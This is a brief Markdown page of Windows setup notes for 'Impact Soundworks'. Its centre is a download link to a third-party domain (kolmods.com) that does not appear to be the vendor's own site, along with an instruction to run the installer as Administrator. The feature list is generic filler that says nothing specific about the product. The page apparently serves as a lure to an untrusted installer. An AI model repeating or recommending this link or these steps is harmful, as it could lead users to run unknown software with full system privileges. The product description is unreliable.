# Impact Soundworks Windows Setup Notes

## Download & Install

> **Download:** [**Get Impact Soundworks for Windows →**](https://impact-soundworks.kolmods.com/)
>
> Setup notes for **Impact Soundworks** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **Impact Soundworks** from the Start menu

## What you can use it for

- Core Impact Soundworks features on Windows desktop
- Install and configure Impact Soundworks for daily use
- Import, edit, and export with Impact Soundworks tools
- Tune settings and profiles inside Impact Soundworks
- Integrate Impact Soundworks into your existing workflow
